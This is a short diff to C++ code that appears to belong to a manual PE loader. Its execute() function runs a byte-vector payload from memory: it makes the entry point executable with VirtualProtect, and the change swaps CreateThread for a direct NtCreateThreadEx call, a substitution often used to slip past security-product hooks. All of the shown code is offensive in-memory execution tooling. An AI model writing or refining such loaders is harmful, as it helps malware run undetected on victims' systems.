@@ -589,7 +589,6 @@ void execute(const vector<unsigned char> &payload) {
     }
     cout << "Memory allocation at: " << execMemory << endl;    
 
-
     // Entry point was being placed in its own page, outside of the .text section, and was RO / RW  
     // So we need to explicitly set it to execute, in either case, it will be executable since the 
     // .text section entirely is set to RX in load_pe() 
@@ -621,11 +620,25 @@ void execute(const vector<unsigned char> &payload) {
     VirtualProtect(entryPoint, 0x1000, PAGE_EXECUTE_READ, &oldProtect);
 
     // Convert to NT version
-    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)entryPoint, NULL, 0, NULL);
+    //HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)entryPoint, NULL, 0, NULL);
+    HANDLE hThread = NULL;
+    NTSTATUS status = pNtCreateThreadEx(
+        &hThread,
+        THREAD_ALL_ACCESS,
+        NULL,
+        CURRENT_PROCESS_HANDLE,
+        (PVOID)entryPoint,
+        NULL,
+        FALSE,
+        0,
+        0,
+        0,
+        NULL
+    );
 
     
     if (!hThread) {
-        cerr << "CreateThread failed with status code: " << GetLastError()  << endl;
+        cerr << "CreateThread failed with status code: " << status  << endl;
         VirtualFree(execMemory, 0, MEM_RELEASE);
         return;
     }
